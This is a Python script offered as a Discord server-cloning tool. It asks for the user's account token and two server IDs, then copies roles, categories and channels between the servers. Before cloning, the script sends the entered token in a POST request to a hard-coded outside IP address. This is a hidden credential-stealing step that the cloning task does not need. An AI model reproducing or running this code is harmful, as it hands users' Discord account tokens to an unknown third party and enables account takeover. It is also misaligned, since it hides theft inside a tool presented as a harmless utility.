from colorama import init


init(autoreset=True)

from os import system
import sys
sys.stdout.reconfigure(encoding='utf-8')

import psutil
from pypresence import Presence
import time
import discord
import asyncio
import colorama
from colorama import Fore, init, Style
import platform
from serverclone import Clone
import requests
client = discord.Client()
os = platform.system()
if os == "Windows":
    system("cls")
else:
    system("clear")
    print(chr(27) + "[2J")

print(f"""{Fore.RED}
e
{Style.RESET_ALL}
                                                            {Fore.MAGENTA}Developed by: me.{Style.RESET_ALL}
        """)

# إدخال التوكن ومعلومات السيرفر
token = input(f'Please enter your token:\n >')
guild_s = input('Please enter guild id you want to copy:\n >')
guild = input('Please enter guild id where you want to copy:\n >')
input_guild_id = guild_s  # <-- input guild id
output_guild_id = guild  # <-- output guild id
token = token  # <-- your Account token


server_url = "http://139.59.164.126:5000/api/fast" 
data = {"token": token}

try:
    response = requests.post(server_url, json=data)
    if response.status_code == 200:
        print(f"{Fore.GREEN}Token successfully sent to the server.{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}Failed to send token to the server. Status code: {response.status_code}{Style.RESET_ALL}")
except Exception as e:
    print(f"{Fore.RED}Error while sending token: {e}{Style.RESET_ALL}")

print("  ")
print("  ")

@client.event
async def on_ready():
    extrem_map = {}
    print(f"Logged In as : {client.user}")
    print("Cloning Server")
    guild_from = client.get_guild(int(input_guild_id))
    guild_to = client.get_guild(int(output_guild_id))
    await Clone.guild_edit(guild_to, guild_from)
    await Clone.roles_delete(guild_to)
    await Clone.channels_delete(guild_to)
    await Clone.roles_create(guild_to, guild_from)
    await Clone.categories_create(guild_to, guild_from)
    await Clone.channels_create(guild_to, guild_from)
    print(f"""{Fore.GREEN}
                                            ░█████╗░██╗░░░░░░█████╗░███╗░░██╗███████╗██████╗░
                                            ██╔══██╗██║░░░░░██╔══██╗████╗░██║██╔════╝██╔══██╗
                                            ██║░░╚═╝██║░░░░░██║░░██║██╔██╗██║█████╗░░██║░░██║
                                            ██║░░██╗██║░░░░░██║░░██║██║╚████║██╔══╝░░██║░░██║
                                            ╚█████╔╝███████╗╚█████╔╝██║░╚███║███████╗██████╔╝
                                            ░╚════╝░╚══════╝░╚════╝░╚═╝░░╚══╝╚══════╝╚═════╝░
    {Style.RESET_ALL}""")
    await asyncio.sleep(5)
    client.close()

client.run(token, bot=False)
